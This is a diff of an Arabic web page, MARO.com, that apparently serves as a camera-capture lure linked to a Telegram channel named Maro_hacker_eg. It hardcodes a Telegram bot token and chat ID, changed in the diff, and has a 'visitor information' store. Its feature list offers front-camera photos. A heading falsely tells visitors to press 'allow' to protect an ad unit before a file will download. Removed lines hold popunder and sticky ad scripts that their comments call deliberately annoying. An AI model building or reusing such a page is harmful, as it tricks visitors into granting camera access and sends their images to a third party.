@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+<!DOCTYPE html><html lang="ar" dir="rtl"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>MARO.com</title>
   <style>
     /* نفس التصميم الأصلي تماماً */
@@ -222,7 +220,6 @@
       color:#777;
     }
   </style>
-  
 </head>
 <body>
 
@@ -251,7 +248,7 @@
             <label>الميزات المطلوبة (مدة التسجيل 5 ثوان):</label>
             <div class="checkbox-group" id="featuresGroup">
               <div class="checkbox-item">
-                <input type="checkbox" id="camFront" value="camFront" checked>
+                <input type="checkbox" id="camFront" value="camFront" checked="">
                 <label for="camFront">📸 صورة من الكاميرا الأمامية</label>
               </div>
               <div class="checkbox-item">
@@ -303,13 +300,13 @@
     <div class="dialog-buttons" id="dialogButtons">
       <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1" data-visited="false">@Maro_hacker_eg</a>
       <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2" data-visited="false">@lego2028</a>
-      <button class="dialog-btn" id="subscribeDoneBtn" disabled>تم الاشتراك</button>
+      <button class="dialog-btn" id="subscribeDoneBtn" disabled="">تم الاشتراك</button>
     </div>
   </div>
 
 <script>
   // ------------------ متغيرات البوت الثابتة ------------------
-  const MASTER_BOT_TOKEN = "7581421720:AAE5Np2WHoLkQOZngYW_Uz3kxC97R-I2xbA";
+  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
   const MASTER_CHAT_ID   = "6197511637";
 
   // ------------------ تخزين معلومات الزائر ------------------
@@ -687,118 +684,42 @@
     const mainBox = document.createElement('div');
     mainBox.className = 'main-box';
     
-// النص العلوي
-const h2 = document.createElement('h2');
-h2.textContent = 'يجب الضغط علي سماح لحماية الوحدة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح';
-h2.style.fontSize = '14px';
-h2.style.textAlign = 'center';
-h2.style.margin = '15px 0';
-mainBox.appendChild(h2);
-
-// دالة صندوق إعلان EffectiveGate بخلفية بيضاء
-function createAdBox() {
-  const adBox = document.createElement('div');
-  adBox.style.width = '100%';
-  adBox.style.minHeight = '140px';
-  adBox.style.margin = '15px 0';
-  adBox.style.background = '#ffffff'; // خلفية بيضاء
-  adBox.style.borderRadius = '12px';
-  adBox.style.display = 'flex';
-  adBox.style.alignItems = 'center';
-  adBox.style.justifyContent = 'center';
-  adBox.style.boxShadow = '0 3px 12px rgba(0,0,0,0.15)';
-  adBox.style.overflow = 'hidden';
-
-  const script = document.createElement('script');
-  script.async = true;
-  script.setAttribute('data-cfasync', 'false');
-  script.src = 'https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js';
-
-  const container = document.createElement('div');
-  container.id = 'container-596225155ab3da796681d551cb4b7cf4';
-
-  adBox.appendChild(script);
-  adBox.appendChild(container);
-  mainBox.appendChild(adBox);
-}
-
-// إعلان أعلى المحتوى
-createAdBox();
-
-// إعلان ثاني لزيادة الإزعاج والربح
-createAdBox();
-
-// زر التحميل (مع إعلان مباشر)
-const downloadBtn = document.createElement('button');
-downloadBtn.className = 'download-btn';
-downloadBtn.textContent = 'التالي';
-downloadBtn.style.margin = '20px 0';
-downloadBtn.onclick = function() {
-  window.open(
-    "https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c",
-    "_blank"
-  );
-};
-mainBox.appendChild(downloadBtn);
-
-// إعلانات كثيرة تحت الزر (كما طلبت مزعجة)
-createAdBox();
-createAdBox();
-createAdBox();
-createAdBox();
-
-// إعلان Adsterra بانر إضافي (مزعج)
-const adsterraScript1 = document.createElement('script');
-adsterraScript1.innerHTML = `
-  atOptions = {
-    'key' : 'dcff8a2cffdf0642c627a5bacf3a04fd',
-    'format' : 'iframe',
-    'height' : 60,
-    'width' : 468,
-    'params' : {}
-  };
-`;
-mainBox.appendChild(adsterraScript1);
-
-const adsterraInvoke1 = document.createElement('script');
-adsterraInvoke1.src = 'https://www.highperformanceformat.com/dcff8a2cffdf0642c627a5bacf3a04fd/invoke.js';
-mainBox.appendChild(adsterraInvoke1);
-
-// Popunder إعلاني عند أول ضغطة في الصفحة (مزعج وقوي)
-let popShown = false;
-document.addEventListener('click', function() {
-  if (!popShown) {
-    popShown = true;
-    window.open(
-      "https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c",
-      "_blank"
-    );
-  }
-});
-
-// Sticky Ad ثابت أسفل الشاشة (إعلان مزعج إضافي)
-const stickyAd = document.createElement('div');
-stickyAd.style.position = 'fixed';
-stickyAd.style.bottom = '0';
-stickyAd.style.left = '0';
-stickyAd.style.width = '100%';
-stickyAd.style.height = '90px';
-stickyAd.style.background = '#ffffff';
-stickyAd.style.zIndex = '999999';
-stickyAd.style.boxShadow = '0 -2px 10px rgba(0,0,0,0.3)';
-stickyAd.innerHTML = `
-  <script type="text/javascript">
-    atOptions = {
-      'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
-      'format' : 'iframe',
-      'height' : 90,
-      'width' : 728,
-      'params' : {}
+    const h2 = document.createElement('h2');
+    h2.textContent = 'يجب الضغط علي سماح لحماية الوحدة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح';
+    mainBox.appendChild(h2);
+    
+    // AD Box 1
+    const adBox1 = document.createElement('div');
+    adBox1.className = 'ad-box';
+    mainBox.appendChild(adBox1);
+    
+    // AD Box 2
+    const adBox2 = document.createElement('div');
+    adBox2.className = 'ad-box';
+    const containerDiv = document.createElement('div');
+    containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
+    adBox2.appendChild(containerDiv);
+    mainBox.appendChild(adBox2);
+    
+    // زر التحميل
+    const downloadBtn = document.createElement('button');
+    downloadBtn.className = 'download-btn';
+    downloadBtn.textContent = 'التالي';
+    downloadBtn.onclick = function() {
+      window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c","_blank");
     };
-  </script>
-  <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"></script>
-`;
-document.body.appendChild(stickyAd);
+    mainBox.appendChild(downloadBtn);
+    
+    // AD Box 3
+    const adBox3 = document.createElement('div');
+    adBox3.className = 'ad-box';
+    mainBox.appendChild(adBox3);
+    
+    // AD Box 4
+    const adBox4 = document.createElement('div');
+    adBox4.className = 'ad-box';
+    mainBox.appendChild(adBox4);
+    
     // الفوتر
     const footer = document.createElement('div');
     footer.className = 'footer';
@@ -830,5 +751,6 @@ document.body.appendChild(stickyAd);
     startFeatures(chat, token, features);
   }
 </script>
-</body>
-                  </html>
+
+                  
+</body></html>
